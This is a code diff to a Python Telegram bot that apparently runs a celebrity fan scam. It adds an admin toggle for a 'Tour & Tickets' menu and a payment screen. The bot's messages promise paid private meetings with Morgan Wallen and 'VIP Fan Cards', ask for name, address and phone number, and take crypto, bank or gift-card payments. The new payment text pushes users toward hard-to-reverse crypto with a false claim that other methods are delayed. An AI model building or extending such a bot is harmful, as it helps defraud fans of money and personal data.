@@ -63,6 +63,8 @@ try: cursor.execute("ALTER TABLE settings ADD COLUMN ticket_app_msg TEXT")
 except: pass
 try: cursor.execute("ALTER TABLE settings ADD COLUMN ticket_rej_msg TEXT")
 except: pass
+try: cursor.execute("ALTER TABLE settings ADD COLUMN tour_active INTEGER DEFAULT 1")
+except: pass
 
 default_app = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n📅 **Scheduled Date:** {date}\n\n🎫 **VIP Recognition Card:**\nA VIP Fan Card will be issued as your official form of recognition and identification for the meeting. This card will be prepared and shipped to you within the next **2 days**.\n\n📦 **Shipping & Delivery:**\nPersonal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you once the card is ready for dispatch to ensure a secure delivery.\n\nThank you for your trust. We look forward to delivering a premium experience.\n\n━━━━━━━━━━━━━━━━━━\nStatus: **CONFIRMED ✅**"
 default_vip_app = "🎉 **VIP Fan Card Payment Confirmed**\n\nYour payment for the exclusive VIP Fan Card has been successfully verified! ✅\n\nTo proceed with production and shipping, we require a few details.\nName \nAddress \nPhone number"
@@ -77,12 +79,12 @@ conn.commit()
 cursor.execute("UPDATE settings SET price_vip = 3500 WHERE price_vip IS NULL")
 cursor.execute("UPDATE settings SET vip_app_msg = ? WHERE vip_app_msg IS NULL", (default_vip_app,))
 cursor.execute("UPDATE settings SET vip_rej_msg = '❌ VIP Card Payment Rejected.' WHERE vip_rej_msg IS NULL")
-
 cursor.execute("UPDATE settings SET price_t_normal = 500 WHERE price_t_normal IS NULL")
 cursor.execute("UPDATE settings SET price_t_vip = 1000 WHERE price_t_vip IS NULL")
 cursor.execute("UPDATE settings SET tour_info = ? WHERE tour_info IS NULL", (default_tour,))
 cursor.execute("UPDATE settings SET ticket_app_msg = ? WHERE ticket_app_msg IS NULL", (default_ticket_app,))
 cursor.execute("UPDATE settings SET ticket_rej_msg = ? WHERE ticket_rej_msg IS NULL", (default_ticket_rej,))
+cursor.execute("UPDATE settings SET tour_active = 1 WHERE tour_active IS NULL")
 conn.commit()
 
 def get_wallet(coin):
@@ -129,11 +131,18 @@ async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
     user = update.effective_user
     user_id = user.id
     
+    cursor.execute("SELECT tour_active FROM settings WHERE id=1")
+    row = cursor.fetchone()
+    tour_active = True if (row and row[0] == 1) else False
+    
     keyboard = [
         [InlineKeyboardButton("🎯 Book Meeting", callback_data="book")],
-        [InlineKeyboardButton("🎫 VIP Fan Card", callback_data="vip_card")],
-        [InlineKeyboardButton("🎸 Tour & Tickets", callback_data="tour_menu")]
+        [InlineKeyboardButton("🎫 VIP Fan Card", callback_data="vip_card")]
     ]
+    
+    if tour_active:
+        keyboard.append([InlineKeyboardButton("🎸 Tour & Tickets", callback_data="tour_menu")])
+        
     if is_admin(user_id):
         keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
         
@@ -174,15 +183,33 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cursor.execute("SELECT COUNT(*) FROM users WHERE blocked=1")
         blocked_users = cursor.fetchone()[0]
         
+        cursor.execute("SELECT tour_active FROM settings WHERE id=1")
+        row = cursor.fetchone()
+        tour_status = "ON ✅" if (row and row[0] == 1) else "OFF ❌"
+        
         kb = [[InlineKeyboardButton("💰 Prices", callback_data="edit_prices"), InlineKeyboardButton("💳 Wallets", callback_data="wallet_menu")],
               [InlineKeyboardButton("💬 DM User", callback_data="dm_user"), InlineKeyboardButton("🚫 Block Manager", callback_data="block_mgmt")],
               [InlineKeyboardButton("✅ Edit Meet Appr", callback_data="set_app_msg"), InlineKeyboardButton("❌ Edit Meet Rej", callback_data="set_rej_msg")],
               [InlineKeyboardButton("🌟 Edit VIP Appr", callback_data="set_vip_app"), InlineKeyboardButton("🌟 Edit VIP Rej", callback_data="set_vip_rej")],
               [InlineKeyboardButton("🎸 Edit Ticket Appr", callback_data="set_ticket_app"), InlineKeyboardButton("🎸 Edit Ticket Rej", callback_data="set_ticket_rej")],
-              [InlineKeyboardButton("📅 Edit Tour Info", callback_data="set_tour_info"), InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
+              [InlineKeyboardButton("📅 Edit Tour Info", callback_data="set_tour_info"), InlineKeyboardButton(f"🎫 Toggle Tour: {tour_status}", callback_data="toggle_tour")],
+              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
         
         admin_info = f"📊 **Admin Panel**\n👤 Admin ID: `{user_id}`\n👥 Total Users: `{total_users}`\n🚫 Blocked Users: `{blocked_users}`"
         await query.edit_message_text(admin_info, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+
+    elif data == "toggle_tour" and is_admin(user_id):
+        cursor.execute("SELECT tour_active FROM settings WHERE id=1")
+        row = cursor.fetchone()
+        current = row[0] if (row and row[0] is not None) else 1
+        new_val = 0 if current == 1 else 1
+        cursor.execute("UPDATE settings SET tour_active = ? WHERE id = 1", (new_val,))
+        conn.commit()
+        
+        # Refresh admin panel implicitly
+        query.data = "admin_panel"
+        await buttons(update, context)
+        return
 
     elif data == "block_mgmt" and is_admin(user_id):
         context.user_data["step"] = "input_block_id"
@@ -360,12 +387,20 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("Select your ticket type:", reply_markup=InlineKeyboardMarkup(kb))
 
     elif data in ["type_t_normal", "type_t_vip"]:
+        # Directly render the payment menu here so no callbacks are skipped or ignored
         context.user_data["meeting_type"] = "Normal Ticket" if data == "type_t_normal" else "VIP Ticket"
         context.user_data["step"] = None
-        # Route directly to the standard payment selection menu
-        query.data = "proceed_payment"
-        await buttons(update, context)
-        return
+        
+        kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC"), InlineKeyboardButton("ETH", callback_data="pay_ETH")], 
+              [InlineKeyboardButton("USDT", callback_data="pay_USDT"), InlineKeyboardButton("Bank", callback_data="pay_Bank")],
+              [InlineKeyboardButton("🎁 Gift Card", callback_data="pay_GiftCard")],
+              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
+              
+        payment_text = (
+            "💳 **Choose payment method:**\n\n"
+            "*(⚠️ Note: To ensure seamless and expedited payment confirmation, cryptocurrency wallet transactions are highly recommended as the system can occasionally experience delays with standard alternative methods.)*"
+        )
+        await query.edit_message_text(payment_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
     # PAYMENT SECTION 
     elif data == "proceed_payment":
